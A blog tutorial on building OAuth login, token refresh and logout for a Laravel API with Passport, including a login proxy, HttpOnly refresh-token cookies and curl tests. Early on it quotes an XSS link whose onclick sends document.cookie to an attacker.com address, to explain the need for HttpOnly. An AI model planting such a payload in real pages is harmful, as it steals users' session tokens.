---
layout: post
---

## Implementing OAuth authorization using Laravel Passport 


Okay, so now have all the concepts in order. Now let us get to the code. We want to create a login screen for our SPA so the user can authenticate themselves. Let us just quickly recap the flow.

We create a client in our OAuth server that represents our app
The user enters username + password in the login screen and sends it to the API
The API sends the username + password + client ID + client secret to the OAuth server
The API saves the refresh token in a HttpOnly cookie
The API sends the access token to the client
The client saves the access token in storage, for instance a browser app saves it in localStorage
The client requests something from the API attaching the access token to the request's Authorization header
The API sends the access token to the OAuth server for validation
The API sends the requested resource back to the client
When the access token expires the client request the API for a new token
The API sends the request token to the OAuth server for validation
If valid, steps 4-6 repeats
The reason why you should save the refresh token as a HttpOnly cookie is to prevent Cross-site scripting (XSS) attacks. The HttpOnly flag tells the browser that this cookie should not be accessible through javascript. If this flag was not set and your site let users post unfiltered HTML and javascript a malicious user could post something like this

<a href="#" onclick="window.location = 'http://attacker.com/stole.cgi?text=' + escape(document.cookie); return false;">Click here!</a>
Malicious code is shamelessly stolen from Wikipedia: HTTP cookie

Now when users click the link the attacker will gain their refresh token. That means that now they can generate access tokens and impersonate your user. Ouch!

Enough theory! Let us get on with the code.

## Dependencies we are going to use
Since we are making a Laravel API it makes sense to use Laravel Passport. Laravel's OAuth implementation. It is important to know that Laravel Passport is pretty much just an Laravel integration into The PHP League's OAuth 2 package. Therefore, to learn the concepts on a more granular level I refer to that package instead of Laravel Passport.

PHP League's OAuth package issues JSON Web Token's (JWT). This is simply a way to structure tokens that includes some relevant meta data. For instance the token could include meta data as to whether or not this user is an admin.

## Installation
For more detailed instructions you can always refer to Laravel Passport's documentation.

First install Passport using composer.

```html
composer require laravel/passport
```
And add the service provider to config/app.php.
```html
Laravel\Passport\PassportServiceProvider::class,
```
And migrate the tables.

```html
php artisan migrate
```
When the authorization server returns tokens these are actually encrypted on the server using a 1024-bit RSA keys. Both the private and the public key will live in your storage/ out of sight. To generate the RSA keys run this command. The command will also create our password client.

```html
php artisan passport:install
```
Remember to save your client secrets somewhere. I usually save them in my .env file.

```html
PERSONAL_CLIENT_ID=1
PERSONAL_CLIENT_SECRET=mR7k7ITv4f7DJqkwtfEOythkUAsy4GJ622hPkxe6
PASSWORD_CLIENT_ID=2
PASSWORD_CLIENT_SECRET=FJWQRS3PQj6atM6fz5f6AtDboo59toGplcuUYrKL
```

The personal grant type is a special type of grant that issues tokens that do not expire. For instance when you issue access tokens from your GitHub account to be used in for instance Composer that is a personal grant access token. One that composer can use for perpetuity to request GitHub on your behalf.

Please refer to Laravel Passport's documentation for the following steps as they might change in the future.

You will need to add the Laravel\Passport\HasApiTokens trait to your user model. If you use my Laravel API fork all these next things are already done for you.

Next you need to run Passport::routes(); somewhere, preferably in a your AuthServiceProvider. Finally in config/auth.php set the driver property of the api authentication guard to passport. If your user model is NOT App\Users then you need to change the config in config/auth.php under providers.users.model.

```php
<?php

return [
    'namespaces' => [
        'Api' => base_path() . DIRECTORY_SEPARATOR . 'api',
        'Infrastructure' => base_path() . DIRECTORY_SEPARATOR . 'infrastructure'
    ],


    'protection_middleware' => [
        'auth:api' // <--- Checks for access token and logging in the user
    ],

    'resource_namespace' => 'resources',

    'language_folder_name' => 'lang',

    'view_folder_name' => 'views'
];

```
## Configure Passport to issue short-lived tokens
Now Passport is pretty much installed. However, there is one important step. Remember how access tokens should be short-lived? Passport by default issues long-lived tokens (no, I do not know why). So we need to configure that. In the place where you ran Passport::routes(); (AuthServiceProvider or similar) put in the following configuration.

```php
Passport::routes(function ($router) {
    $router->forAccessTokens();
    $router->forPersonalAccessTokens();
    $router->forTransientTokens();
});

Passport::tokensExpireIn(Carbon::now()->addMinutes(10));

Passport::refreshTokensExpireIn(Carbon::now()->addDays(10));

```


Also notice we replaced Passport::routes(); with a more granular configuration. This way we only create the routes that we need. forAccessTokens(); enable us to create access tokens. forPersonalAccessTokens(); enable us to create personal tokens although we will not use this in this article. Lastly, forTransientTokens(); creates the route for refreshing tokens.

This is my configuration. So an access token expires after 10 minutes and an refresh token expires after 10 days. However, in reality your user will probably not be logged out every 10 days since every refresh will generate a new refresh token as well (which again will have 10 days expiration).

What did we install?
If you run php artisan route:list you can see the new endpoints installed by Laravel Passport. I have extracted the ones we are going to focus on below.

```html
| POST | oauth/token         | \Laravel\Passport\Http\Controllers\AccessTokenController@issueToken
| POST | oauth/token/refresh | \Laravel\Passport\Http\Controllers\TransientTokenController@refresh
```
These are the two routes that our proxy is going to request to generate access tokens. Notice, even though these two are publicly available they require the client ID and the client secret which is only known by our API. So it would be near impossible to request tokens outside of our flow.

Creating the login proxy
Now let us install our own routes. This article will assume you have been following the previous articles and have a structure setup similar to my Laravel API fork.

Start by creating three new routes: POST /login, POST /login/refresh and POST /logout. And then add a new controller to Infrastructure\Auth\Controllers. Put the login and refresh routes in a public routes file (your user needs to be able to login without a valid access token). Put the login route in a protected routes file. This will ensure that we can identify the user and revoke his tokens.

Put the routes in infrastructure/Auth/routes_public.php.

```php
<?php

$router->post('/login', 'LoginController@login');
$router->post('/login/refresh', 'LoginController@refresh');
Put this route in infrastructure/Auth/routes_protected.php.

<?php

$router->post('/logout', 'LoginController@logout');
Put the controller in infrastructure/Auth/Controllers/LoginController.php.

<?php

namespace Infrastructure\Auth\Controllers;

use Illuminate\Http\Request;
use Infrastructure\Auth\LoginProxy;
use Infrastructure\Auth\Requests\LoginRequest;
use Infrastructure\Http\Controller;

class LoginController extends Controller
{
    private $loginProxy;

    public function __construct(LoginProxy $loginProxy)
    {
        $this->loginProxy = $loginProxy;
    }

    public function login(LoginRequest $request)
    {
        $email = $request->get('email');
        $password = $request->get('password');

        return $this->response($this->loginProxy->attemptLogin($email, $password));
    }

    public function refresh(Request $request)
    {
        return $this->response($this->loginProxy->attemptRefresh());
    }

    public function logout()
    {
        $this->loginProxy->logout();

        return $this->response(null, 204);
    }
}
```

I also made a LoginRequest class and put it in infrastructure/Auth/Requests/LoginRequest.php.


```php
<?php

namespace Infrastructure\Auth\Requests;

use Infrastructure\Http\ApiRequest;

class LoginRequest extends ApiRequest
{
    public function authorize()
    {
        return true;
    }

    public function rules()
    {
        return [
            'email'    => 'required|email',
            'password' => 'required'
        ];
    }
}

```
Now we have the structure setup to create access tokens for our users. All of this should seem pretty familiar to you. So let us move right along to the proxy class. Put this code in infrastructure/Auth/LoginProxy.php.


```php
<?php

namespace Infrastructure\Auth;

use Illuminate\Foundation\Application;
use Infrastructure\Auth\Exceptions\InvalidCredentialsException;
use Api\Users\Repositories\UserRepository;

class LoginProxy
{
    const REFRESH_TOKEN = 'refreshToken';

    private $apiConsumer;

    private $auth;

    private $cookie;

    private $db;

    private $request;

    private $userRepository;

    public function __construct(Application $app, UserRepository $userRepository) {
        $this->userRepository = $userRepository;

        $this->apiConsumer = $app->make('apiconsumer');
        $this->auth = $app->make('auth');
        $this->cookie = $app->make('cookie');
        $this->db = $app->make('db');
        $this->request = $app->make('request');
    }

    /**
     * Attempt to create an access token using user credentials
     *
     * @param string $email
     * @param string $password
     */
    public function attemptLogin($email, $password)
    {
        $user = $this->userRepository->getWhere('email', $email)->first();

        if (!is_null($user)) {
            return $this->proxy('password', [
                'username' => $email,
                'password' => $password
            ]);
        }

        throw new InvalidCredentialsException();
    }

    /**
     * Attempt to refresh the access token used a refresh token that
     * has been saved in a cookie
     */
    public function attemptRefresh()
    {
        $refreshToken = $this->request->cookie(self::REFRESH_TOKEN);

        return $this->proxy('refresh_token', [
            'refresh_token' => $refreshToken
        ]);
    }

    /**
     * Proxy a request to the OAuth server.
     *
     * @param string $grantType what type of grant type should be proxied
     * @param array $data the data to send to the server
     */
    public function proxy($grantType, array $data = [])
    {
        $data = array_merge($data, [
            'client_id'     => env('PASSWORD_CLIENT_ID'),
            'client_secret' => env('PASSWORD_CLIENT_SECRET'),
            'grant_type'    => $grantType
        ]);

        $response = $this->apiConsumer->post('/oauth/token', $data);

        if (!$response->isSuccessful()) {
            throw new InvalidCredentialsException();
        }

        $data = json_decode($response->getContent());

        // Create a refresh token cookie
        $this->cookie->queue(
            self::REFRESH_TOKEN,
            $data->refresh_token,
            864000, // 10 days
            null,
            null,
            false,
            true // HttpOnly
        );

        return [
            'access_token' => $data->access_token,
            'expires_in' => $data->expires_in
        ];
    }

    /**
     * Logs out the user. We revoke access token and refresh token.
     * Also instruct the client to forget the refresh cookie.
     */
    public function logout()
    {
        $accessToken = $this->auth->user()->token();

        $refreshToken = $this->db
            ->table('oauth_refresh_tokens')
            ->where('access_token_id', $accessToken->id)
            ->update([
                'revoked' => true
            ]);

        $accessToken->revoke();

        $this->cookie->queue($this->cookie->forget(self::REFRESH_TOKEN));
    }
}

```


Quite the mouthful, I know. But the important code lives in proxy(). Let us take a closer look.

```php
public function proxy($grantType, array $data = [])
{
    /*
    We take whatever passed data and add the client credentials
    that we saved earlier in .env. So when we refresh we send client
    credentials plus our refresh token, and when we use the password
    grant we pass the client credentials plus user credentials.
    */
    $data = array_merge($data, [
        'client_id'     => env('PASSWORD_CLIENT_ID'),
        'client_secret' => env('PASSWORD_CLIENT_SECRET'),
        'grant_type'    => $grantType
    ]);

    /*
    We use Optimus\ApiConsumer to make an "internal" API request.
    More on this below.
    */
    $response = $this->apiConsumer->post('/oauth/token', $data);

    /*
    If a token was not created, for whatever reason we throw
    a InvalidCredentialsException. This will return a 401
    status code to the client so that the user can take
    appropriate action.
    */
    if (!$response->isSuccessful()) {
        throw new InvalidCredentialsException();
    }

    $data = json_decode($response->getContent());

    /*
    We save the refresh token in a HttpOnly cookie. This
    will be attached to the response in the form of a
    Set-Cookie header. Now the client will have this cookie
    saved and can use it to request new access tokens when
    the old ones expire.
    */
    $this->cookie->queue(
        self::REFRESH_TOKEN,
        $data->refresh_token,
        864000, // 10 days
        null,
        null,
        false,
        true // HttpOnly
    );

    return [
        'access_token' => $data->access_token,
        'expires_in' => $data->expires_in
    ];
}

```


##Testing that things work

Now we are ready to test that things are working. First you will need to add a user. Somewhere add this code and run it.

```php
DB::table('users')->insert([
  'name' => 'Esben',
  'email' => 'esben@esben.dk',
  'password' => password_hash('1234', PASSWORD_BCRYPT)
]);
```
This should add a user for us to use for testing. Just remember to remove it again. There are a lot of ways for us to test. I prefer to do it quickly from the command line using cURL. Run the command below. Remember to switch the url to your own.

```html
curl -X POST http://larapi.dev/login -b cookies.txt -c cookies.txt -D headers.txt -H 'Content-Type: application/json' -d '
    {
        "email": "esben@esben.dk",
        "password": "1234"
    }
'
```
If you get a response like the one below everything is working properly. If not, try to backtrack and see if you missed a step.


```html
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6Ijc5Y2M4NDVjMGQ3YjZkYjcxMThjNjI3NDRhZTM0MzFkYzc3NTNkODEyNTFjNzFkM2M0MjgwMmVkMmE1ZmVmNDI1ZDk2ODUzOTNlZWIzNDE1In0.eyJhdWQiOiIyIiwianRpIjoiNzljYzg0NWMwZDdiNmRiNzExOGM2Mjc0NGFlMzQzMWRjNzc1M2Q4MTI1MWM3MWQzYzQyODAyZWQyYTVmZWY0MjVkOTY4NTM5M2VlYjM0MTUiLCJpYXQiOjE0ODk5MTQ4MjIsIm5iZiI6MTQ4OTkxNDgyMiwiZXhwIjoxNDg5OTE1NDIyLCJzdWIiOiIyIiwic2NvcGVzIjpbXX0.Se3rO03T9w93m31gSCy8O-FnCZP6FCoIUhU9AyY-Nl3ZZHciuPEP0NikPhrssIOa4-gLRk53j53S_j6Twv_PY_sRosCe2kDA0Qdao5zePV79M_sEvb9VOcbcRHSJMU0GcNo0Cs7B8gf8YDlArj5qKIkoOctO1r9SWcpoEqBl1nHPmueTCUotu3CWWB-LXPNTIMZk13B9misb3oq0n4PUqivAT73aSWLgVH_eJbvG8zxdumpZME_TgX_36YemDm3l_31PMczH9QRkRf86ShP2Ji6gbVZrFnbI5UFOXWEVDGSfl6FVa5NqDi9iqpKNc4WCossy9DlAGGYtKFsbNpMxULZWv7NevblnQ5j0SpbEo_ISSKzfrWELNNSj06KeG7Et8SudIhyTaLv4GIDBA5U-LQY-Z4XutlxVrlkmb2OmClp1SmTaMGK0Fqge3DuxnfurBH3rLrVeOa9OIYz_VUXu9SQhKdLEZyPX3uNO7Yuh5DhLrQ8INrwcYxN1dtg9GNpWqM9h4DJNZ3mPaoEgAGTzzCmXXJL1KF7_h5F2EVl2h0dbzQMZjdacjVvkL-oWLwEXjykpqano6xHUDaYp9Q7RID7ehNcUUwhir8035DnxBr8O3-TVT4QHVWJA-GMVXhpLdHrah2gbhEDfgSoGKuAQQW9KkqTsaC4DvIeYuuKGOB8","expires_in":600}

```
If you open headers.txt you can also see the refresh token being set as a HttpOnly cookie.

```html
HTTP/1.1 200 OK
Server: nginx
Content-Type: application/json; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive
Vary: Accept-Encoding
X-Powered-By: PHP/7.0.10
Cache-Control: no-cache, private
Date: Sun, 19 Mar 2017 09:13:42 GMT
Set-Cookie: refreshToken=eyJpdiI6InQyam9vSXRMenIxMFFWWVVDTUhlbFE9PSIsInZhbHVlIjoiTFF5ZkNlaWNJRmsxSEg4T01XZVN5Q3N3a3hmOTFpU012aFE3N2E4WTd0RXFJMjJNNzVLRTFPUWpKdk52THkyQzc0VFwvcnczaG5lcXR6ZW1BR05TcGMwWFZZZldoNzhHczJtRHhzSjhkVFVqVkQyWEVqUWpNeTdnd3plVDA3TW4wYituTHZHdW5jV01CWWJkZHA5b3V3TmJrZXZpaUhLcmhkTGdqb2lcLzZTb201bzJOaU1DTTdjbkxvZzRWK3lEOXpyMThmVGRPSmZFc09Jc2x1cGV1RmIrVEdSa1RFb1BhSmtTMTRtMXVGMzdkTkRsXC9oOW45TWZNaVB0aHZ3ZTNVUmN0UHpqaVdSS0hHTUhkYk1vOFZvY2IrUHlvb202cHkxekd2N0UxNnlqeVNDV2pGdjc5eEV5WEFzTGxJNHZlSDk2UFhmdTNoTUs2OGtqSk1UZjE1WTBrUzIxazRFSEtTMnB3Y1ZUdGxqRjZ0bDQ5RUIwMFwvM2h4SG0xbk9OZlQwNFFzUnpURTlrSGxXVGhOaUp4amxyN0cxcGVXdlhrNUhXMldjSnNMZ3hVS0ZUV1A3V1Y5K0pOYnJ5VTVQM2p1clF1T052WFl2Yko4YnJUMmdZV1wvb1pUVnVsMUVwOXpFSWRPS0crTmEwa3MrQXlGYUptYnl0K01WbHZxcGFLUW1NemdMbk54Mjg0dkRFMldNTjF0bGVVNmE0MVlYNXk3V3N3dU8rRmVCN0cxNkYzSWJ0UkNpbWZlTTh1R1RJQTc5SnNKcWNrY0tcL2dmTmNiTFJnTjM3WTJpdzhUdGRmb3R2XC9qYlwvVURyWVFiXC9SN2VKOVNLMGVYWStsdTlHaGkxc01ndmlwM1lnYVBjK2wzMERadVdDRGw3Tjk1c0EzNHlZYXhxVlYzZ3N0SUlKUG5aSHB5SjZlREJIamhQb2loeUduNTBlWkJ0SFgzYitTNHpwbTZMNHVwMnZZUnN1K3JtZlpGM0ZrRjc0TVRHR2dxTFNXVnRTbHJhK2Vyc2NxOEorZDloa3dcL1VcL2F1c1lFVXRudW81Uk1vM0tTcU1BVE5LRE5xeHBrNmR3WTRUSFV2MnFncWZ3WHNwdko5NmRZRnU1XC9RemxzTkVsUmZicXB1SThqbE41TFdtMVQyNE1EY0FWN0g4N0grNGExeWlHZGlYZ2hEXC9WUkh2cFVucTFIT1JcL3hsYXR3eWU3UGJFZGprT24yZ29RbG5hSnUxXC81OXZmdFdwZnIzUEFHXC9qcXdTRT0iLCJtYWMiOiI3MTc3MzVhYjg2MDAyY2MwMDQ1MmUxOWQ2OTcxYzFjYWI3ZDMwZjNkZDMwM2UyY2NhZjE0MzA3MDBmYzdiZWZhIn0%3D; expires=Fri, 09-Nov-2018 09:13:42 GMT; Max-Age=51840000; path=/; HttpOnly
X-UA-Compatible: IE=Edge

```
Because we use the -c and -b flags we will save and use cookies between requests, just like a browser. So we can actually try to refresh our token using the refresh token by running the command below.

```html
curl -X POST http://larapi.dev/login/refresh -b cookies.txt -c cookies.txt
```
If you get a new access token that means this worked as well. Lastly, we can try to run logout.

```html
curl -X POST http://larapi.dev/logout -b cookies.txt -c cookies.txt
```
Now, if you run the refresh command you should get a 401 Unauthorized response.

Scoping user requests to entities belonging to requesting user
So now that we got it all working, how do we using it? Well if you added the auth:api guard to config/optimus.components.php all of your protected routes will now check for a valid access token. If no valid access token was found in the Authorization header of the request Laravel will automatically return a 401 response. What is even more nifty is that Passport will automatically resolve the user model when requesting using the password grant. This means you can access the current user using the AuthManager or the Auth facade.

Imagine you were making the next billion dollar start-up. Let us say you were making the next Slack competitor. Whenever a user logs into a chat room it should display all the channels belonging to that chatroom. So imagine the following relationship.

```html
Chat Room 1 -------> n Users
Chat Room 1 -------> n Channels
```
Channels belonging to a chat room

To fill out the left navigation we have to request all the channels belonging to the Traede team when the user logs in. Imagine we have the endpoint GET /channels and that will just get all the channels appropriate for the user. Now the code below is an arbitrary, made-up example but it should demonstrate how one might go about scoping requests based on the current user.

```php

<?php

namespace Api\ChatRooms\Services;

use Api\ChatRooms\Repositories\ChannelRepository;
use Illuminate\Auth\AuthManager;

class ChatRoomService
{
    private $auth;

    private $channelRepository;

    public function __construct(AuthManager $auth, ChannelRepository $channelRepository)
    {
        $this->auth = $auth;
        $this->channelRepository = $channelRepository;
    }

    public function getChannels()
    {
        $user = $this->auth->user();

        $channels = $this->channelRepository->getWhere('chatroom_id', $user->chatroom_id);

        return $channels;
    }
}

```
Now we can have multiple chatrooms on the same API, using the same database. Every user will get a different response to GET /channels. This was just a small example of how you use the user context to scope your API requests.

## Conclusion
This last example will also conclude this article on how to implement authentication for your API. By using Laravel Passport we easily install a robust authentication solution for our API. Using a proxy and HttpOnly cookies we increase the security of our solution.

Do not forget to further study the principles of OAuth for the best possible setup. Especially remember that the OAuth 2 spec assumes by default that there is a secure connection between the server and the client!
